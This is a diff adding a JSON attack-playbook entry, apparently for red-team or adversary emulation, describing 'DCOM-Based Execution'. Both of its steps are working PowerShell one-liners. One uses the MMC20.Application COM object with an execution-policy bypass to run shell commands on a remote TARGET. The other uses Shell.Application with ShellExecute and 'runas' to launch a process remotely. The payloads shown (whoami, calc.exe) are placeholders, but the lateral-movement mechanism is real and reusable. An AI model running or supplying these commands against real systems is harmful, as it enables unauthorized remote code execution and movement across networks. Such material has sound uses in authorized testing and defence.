@@ -1,0 +1,19 @@
+{
+	"name": "DCOM-Based Execution",
+	"description": "Leverage DCOM objects for remote code execution.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "MMC COM Object",
+			"command": "powershell -ep bypass -c \"$com = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','TARGET')); $doc = $com.Document; $view = $doc.ActiveView; $view.ExecuteShellCommand('cmd.exe',$null,'/c whoami > C:\\temp\\dcom.txt','7')\"",
+			"description": "Run command via MMC."
+		},
+		{
+			"index": 2,
+			"name": "ShellWindows COM",
+			"command": "powershell -c \"$shell = [activator]::CreateInstance([type]::GetTypeFromProgID('Shell.Application','TARGET')); $shell.ShellExecute('cmd.exe','/c calc.exe','','runas',1)\"",
+			"description": "Launch process via Shell."
+		}
+	]
+}
